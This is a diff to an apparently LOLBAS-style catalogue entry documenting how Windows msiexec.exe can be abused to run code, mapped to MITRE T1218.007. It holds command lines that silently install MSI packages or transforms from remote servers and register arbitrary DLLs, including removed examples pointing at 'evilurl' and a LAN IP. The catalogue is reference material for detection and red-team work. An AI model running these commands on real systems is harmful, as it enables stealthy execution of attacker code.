@@ -1,24 +1,29 @@
 ---
 Name: Msiexec.exe
 Description: Used by Windows to execute msi files
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: msiexec /quiet /i cmd.msi
+  - Command: msiexec /quiet /i {PATH:.msi}
     Description: Installs the target .MSI file silently.
     Usecase: Execute custom made msi file with attack code
     Category: Execute
     Privileges: User
     MitreID: T1218.007
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: msiexec /q /i http://192.168.100.3/tmp/cmd.png
+    Tags:
+      - Execute: MSI
+  - Command: msiexec /q /i {REMOTEURL}
     Description: Installs the target remote & renamed .MSI file silently.
     Usecase: Execute custom made msi file with attack code from remote server
     Category: Execute
     Privileges: User
     MitreID: T1218.007
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: msiexec /y "C:\folder\evil.dll"
+    Tags:
+      - Execute: MSI
+      - Execute: Remote
+  - Command: msiexec /y {PATH_ABSOLUTE:.dll}
     Description: Calls DllRegisterServer to register the target DLL.
     Usecase: Execute dll files
     Category: Execute
@@ -27,7 +32,8 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: DLL
-  - Command: msiexec /z "C:\folder\evil.dll"
+      - Execute: Remote
+  - Command: msiexec /z {PATH_ABSOLUTE:.dll}
     Description: Calls DllUnregisterServer to un-register the target DLL.
     Usecase: Execute dll files
     Category: Execute
@@ -36,13 +42,18 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: DLL
-  - Command: msiexec /i "https://trustedURL/signed.msi" TRANSFORMS="https://evilurl/evil.mst" /qb
+      - Execute: Remote
+  - Command: msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
     Description: Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.
     Usecase: Install trusted and signed msi file, with additional attack code as transformation file, from a remote server
     Category: Execute
     Privileges: User
     MitreID: T1218.007
     OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: MSI
+      - Execute: MST
+      - Execute: Remote
 Full_Path:
   - Path: C:\Windows\System32\msiexec.exe
   - Path: C:\Windows\SysWOW64\msiexec.exe
